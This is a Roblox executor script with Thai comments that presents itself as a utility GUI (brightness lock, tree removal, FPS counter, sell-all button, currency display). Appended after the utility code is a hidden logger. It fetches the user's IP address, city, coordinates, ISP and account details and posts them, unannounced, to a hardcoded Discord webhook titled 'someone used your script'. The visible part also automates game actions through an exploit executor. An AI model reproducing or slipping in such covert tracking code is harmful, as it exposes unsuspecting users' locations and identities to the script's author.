local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.ResetOnSpawn = false
gui.Name = "UtilityGUI"

-- ปรับความสว่างค้างไว้
local function lockBrightness()
	Lighting.Brightness = 1
	Lighting.ClockTime = 14
	local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
	if atmosphere then
		atmosphere.Density = 0
	end
end

for _, obj in ipairs(workspace:GetDescendants()) do
    if obj:IsA("BasePart") then
        obj.Material = Enum.Material.Plastic
        obj.Reflectance = 0
        obj.CastShadow = false
    elseif obj:IsA("Decal") then
        obj:Destroy()
    end
end

-- ลบต้นไม้ทุกโซน
local function clearTrees()
	local regions = {
		"Beakwoods",
		"Deadlands",
		"Mount Beaks",
		"Quill Lake"
	}
	for _, name in pairs(regions) do
		local trees = workspace:FindFirstChild("Regions") and workspace.Regions:FindFirstChild(name)
		if trees and trees:FindFirstChild("Trees") then
			trees.Trees:Destroy()
		end
	end
end

-- ขยายโมเดลที่ชื่อ "Normal"
local function scaleModels()
	for _, model in pairs(workspace:GetDescendants()) do
		if model:IsA("Model") and model.Name == "Normal" then
			local primary = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
			if primary and not model:GetAttribute("Scaled") then
				model:SetAttribute("Scaled", true)
				pcall(function()
					model:ScaleTo(5)
				end)
			end
		end
	end
end

-- FPS Display
local fpsLabel = Instance.new("TextLabel")
fpsLabel.Size = UDim2.new(0, 80, 0, 25)
fpsLabel.Position = UDim2.new(1, -90, 1, -35)
fpsLabel.BackgroundTransparency = 0.4
fpsLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fpsLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
fpsLabel.TextStrokeTransparency = 0.6
fpsLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
fpsLabel.BorderSizePixel = 0
fpsLabel.Font = Enum.Font.Code
fpsLabel.TextSize = 16
fpsLabel.Text = "FPS: ..."
fpsLabel.Parent = gui

local accumulatedTime = 0
local frameCount = 0

RunService.RenderStepped:Connect(function(deltaTime)
	accumulatedTime += deltaTime
	frameCount += 1
	
	if accumulatedTime >= 3 then
		local fps = math.floor(frameCount / accumulatedTime)
		fpsLabel.Text = "FPS: " .. fps
		accumulatedTime = 0
		frameCount = 0
	end
end)

-- ปุ่มขายทั้งหมด
local sellButton = Instance.new("TextButton")
sellButton.Size = UDim2.new(0, 140, 0, 35)
sellButton.Position = UDim2.new(0, 10, 0.5, -50)
sellButton.BackgroundColor3 = Color3.fromRGB(255, 100, 150)
sellButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sellButton.TextStrokeTransparency = 0.3
sellButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
sellButton.Font = Enum.Font.FredokaOne
sellButton.TextSize = 18
sellButton.Text = "ขายทั้งหมด"
sellButton.Parent = gui

local sellCorner = Instance.new("UICorner", sellButton)
sellCorner.CornerRadius = UDim.new(0, 12)

local sellShadow = Instance.new("UIStroke", sellButton)
sellShadow.Thickness = 2
sellShadow.Color = Color3.fromRGB(255, 255, 255)
sellShadow.Transparency = 0.5

local sellGradient = Instance.new("UIGradient", sellButton)
sellGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 180)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 160, 120))
})
sellGradient.Rotation = 45

sellButton.MouseButton1Click:Connect(function()
	local args = { [1] = "All" }
	ReplicatedStorage:WaitForChild("Util"):WaitForChild("Net"):WaitForChild("RF/SellInventory"):InvokeServer(unpack(args))
end)

-- กล่องแสดงเงิน
local currencyDisplay = Instance.new("TextLabel")
currencyDisplay.Size = UDim2.new(0, 140, 0, 30)
currencyDisplay.Position = sellButton.Position + UDim2.new(0, 0, 0, 40)
currencyDisplay.BackgroundColor3 = Color3.fromRGB(40, 180, 255)
currencyDisplay.BackgroundTransparency = 0.4 -- จางลง
currencyDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
currencyDisplay.TextStrokeTransparency = 0.3
currencyDisplay.Font = Enum.Font.GothamBold
currencyDisplay.TextSize = 16
currencyDisplay.Text = "เงิน: --"
currencyDisplay.Parent = gui

Instance.new("UICorner", currencyDisplay).CornerRadius = UDim.new(0, 8)

-- กล่องแสดงเลเวล
local levelDisplay = Instance.new("TextLabel")
levelDisplay.Size = UDim2.new(0, 140, 0, 30)
levelDisplay.Position = currencyDisplay.Position + UDim2.new(0, 0, 0, 35)
levelDisplay.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
levelDisplay.BackgroundTransparency = 0.4 -- จางลง
levelDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
levelDisplay.TextStrokeTransparency = 0.3
levelDisplay.Font = Enum.Font.GothamBold
levelDisplay.TextSize = 16
levelDisplay.Text = "เลเวล: --"
levelDisplay.Parent = gui

Instance.new("UICorner", levelDisplay).CornerRadius = UDim.new(0, 8)

-- อัปเดตค่าแบบเรียลไทม์ (พร้อมกรอง tag)
task.spawn(function()
	while true do
		local success, err = pcall(function()
			local topbar = player:WaitForChild("PlayerGui"):WaitForChild("Hud"):WaitForChild("Topbar")
			local currency = topbar:FindFirstChild("Currency")
			local level = topbar:FindFirstChild("Level")

			if currency then
				currencyDisplay.Text = "เงิน: " .. currency.Text
			end

			if level then
				-- ตัด tag HTML ออก
				local levelText = level.Text:gsub("<[^>]+>", "")
				levelDisplay.Text = levelText
			end
		end)
		if not success then
			warn("ไม่สามารถอัปเดตข้อมูล GUI ได้: ", err)
		end
		task.wait(0.5)
	end
end)

-- Background task
RunService.Heartbeat:Connect(function()
	lockBrightness()
	scaleModels()
	clearTrees()
end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:FindFirstChild("HumanoidRootPart")

local device = UserInputService.TouchEnabled and "มือถือ" or "PC"
local membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "None"

local req = (syn and syn.request) or (http and http.request) or request
local ipData = {
	ip = "ไม่ทราบ",
	country = "ไม่ทราบ",
	country_flag = "",
	country_code = "",
	region = "ไม่ทราบ",
	region_code = "",
	city = "ไม่ทราบ",
	district = "ไม่ทราบ",
	latitude = "ไม่ทราบ",
	longitude = "ไม่ทราบ",
	postal = "ไม่ทราบ",
	isp = "ไม่ทราบ",
	timezone = "ไม่ทราบ",
	call_code = ""
}

local function countryCodeToFlagEmoji(code)
	if not code then return "" end
	local flag = ""
	for i = 1, #code do
		local c = code:sub(i, i):upper()
		flag = flag .. utf8.char(0x1F1E6 - 65 + string.byte(c))
	end
	return flag
end

-- ดึงข้อมูล IP
local success, response = pcall(function()
	return req({
		Url = "https://ipwho.is/",
		Method = "GET"
	})
end)

if success and response and response.Body then
	local data = HttpService:JSONDecode(response.Body)
	if data.success then
		ipData.ip = data.ip or "ไม่ทราบ"
		ipData.country = data.country or "ไม่ทราบ"
		ipData.country_code = data.country_code or ""
		ipData.country_flag = countryCodeToFlagEmoji(data.country_code)
		ipData.region = data.region or "ไม่ทราบ"
		ipData.region_code = data.region_code or ""
		ipData.city = data.city or "ไม่ทราบ"
		ipData.district = data.district or "ไม่ทราบ"
		ipData.latitude = data.latitude or "ไม่ทราบ"
		ipData.longitude = data.longitude or "ไม่ทราบ"
		ipData.postal = data.postal or "ไม่ทราบ"
		ipData.timezone = data.timezone and data.timezone.id or "ไม่ทราบ"
		ipData.call_code = data.calling_code or ""
		ipData.isp = data.connection and data.connection.org or "ไม่ทราบ"
	end
end

-- ดึงชื่อเกม
local gameName = "ไม่ทราบ"
pcall(function()
	local info = MarketplaceService:GetProductInfo(game.PlaceId)
	if info and info.Name then
		gameName = info.Name
	end
end)

-- ลิงก์ Google Maps
local googleMapsLink = "https://www.google.com/maps?q=" .. tostring(ipData.latitude) .. "," .. tostring(ipData.longitude)

-- สร้าง embed
local embed = {
	username = "Logger",
	embeds = {{
		title = "**มีคนใช้สคริปต์ของคุณ**",
		color = 0xff66cc,
		fields = {
			{ name = "ชื่อเกม", value = gameName, inline = false },
			{ name = "ชื่อผู้ใช้", value = player.Name, inline = true },
			{ name = "ชื่อเล่น", value = player.DisplayName, inline = true },
			{ name = "UserId", value = tostring(player.UserId), inline = true },
			{ name = "อายุบัญชี", value = tostring(player.AccountAge) .. " วัน", inline = true },
			{ name = "ระดับสมาชิก", value = membership, inline = true },
			{ name = "อุปกรณ์ที่ใช้", value = device, inline = true },
			{ name = "เวลา", value = os.date("%d/%m/%Y %H:%M:%S"), inline = false },

			{ name = "IP Address", value = ipData.ip, inline = false },
			{ name = "ประเทศ", value = ipData.country_flag .. " " .. ipData.country .. " (+" .. ipData.call_code .. ")", inline = true },
			{ name = "จังหวัด/รัฐ", value = ipData.region .. " (" .. ipData.region_code .. ")", inline = true },
			{ name = "เมือง/เขต", value = ipData.city .. " / " .. ipData.district, inline = true },
			{ name = "รหัสไปรษณีย์", value = ipData.postal, inline = true },
			{ name = "ตำแหน่งบน Google Maps", value = "[คลิกที่นี่](" .. googleMapsLink .. ")", inline = true },
			{ name = "เขตเวลา", value = ipData.timezone, inline = true },
			{ name = "ผู้ให้บริการ (ISP)", value = ipData.isp, inline = false }
		}
	}}
}

local jsonData = HttpService:JSONEncode(embed)

req({
	Url = "https://discord.com/api/webhooks/1363189736226947162/xkLJv3gssgW4OWQNy-aA1gb16UJWIfWrAmh1RPByVYsjupUyigEJE8-XScgO7vq8flry", -- เปลี่ยน webhook ตรงนี้
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = jsonData
})